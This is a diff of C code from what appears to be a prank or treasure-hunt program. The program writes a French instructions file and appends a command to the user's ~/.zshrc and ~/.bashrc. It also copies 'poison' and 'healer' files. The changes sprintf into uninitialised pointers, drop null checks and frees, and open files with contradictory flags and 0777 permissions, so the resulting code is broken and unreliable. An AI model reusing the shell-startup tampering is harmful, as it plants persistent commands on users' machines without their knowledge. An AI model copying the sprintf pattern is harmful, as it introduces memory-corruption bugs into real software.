@@ -7,9 +7,10 @@ int	print_consignes(t_data *data, char **envp)
 	char	*t_cmd;
 	char	**cmd;
 
-	path = ft_strjoin(data->active_dir, "/consignes.txt");
-	if (!path)
-		return (1);
+	// path = ft_strjoin(data->active_dir, "/consignes.txt");
+	// if (!path)
+	// 	return (1);
+	sprintf(path, "%s/consignes.txt", data->active_dir);
 	fd = open(path, O_RDONLY | O_WRONLY | O_CREAT | O_TRUNC, 0777);
 	if (fd < 0)
 		return (1);
@@ -21,15 +22,16 @@ int	print_consignes(t_data *data, char **envp)
 	dprintf(fd, "Il ne te reste plus qu'à chercher. Amuse-toi bien ;)\n");
 	close(fd);
 	printf("opening consignes.txt\n");
-	t_cmd = ft_strjoin("open ", path);
-	free(path);
-	if (!t_cmd)
-		return (1);
+	sprintf(t_cmd, "open %s", path);
+	// t_cmd = ft_strjoin("open ", path);
+	// if (!t_cmd)
+	// 	return (1);
 	cmd = ft_split(t_cmd, ' ');
 	if (!cmd)
-		return (free(t_cmd), 1);
+		return (1);
+		// return (free(t_cmd), 1);
 	process_child(cmd, envp);
-	free(t_cmd);
+	// free(t_cmd);
 	free_tab(cmd);
 	return (0);
 }
@@ -42,19 +44,20 @@ int	copy_alias(int file_count, char **envp)
 	static char	*file_list[] = {"/.zshrc", "/.bashrc", NULL};
 	char		*path;
 
+	printf("Start shell rc modifications...\n");
 	i = -1;
 	while (file_list[++i])
 	{
-		path = ft_strjoin(getenv("HOME"), file_list[i]);
-		if (!path)
-			return (1);
+		sprintf(path, "%s%s", getenv("HOME"), file_list[i]);
+		// if (!path)
+		// 	return (1);
 		printf("opening and writing in %s\n", path);
 		fd = open(path, O_CREAT | O_WRONLY | O_APPEND | O_RDONLY);
 		if (fd < 0)
 			return (1);
 		dprintf(fd, "%s\n", command);
 		close(fd);
-		free(path);
+		// free(path);
 	}
 	return (0);
 }
@@ -65,7 +68,7 @@ int	copy_poison(int file_count, char *dir, char **envp)
 	int		i;
 
 	i = -1;
-	// printf("Start poison and healer rand name generation...\n");
+	printf("Start poison and healer copy...\n");
 	cp_command = gen_poison_cmd(file_count, dir);
 	if (!cp_command)
 		return (1);
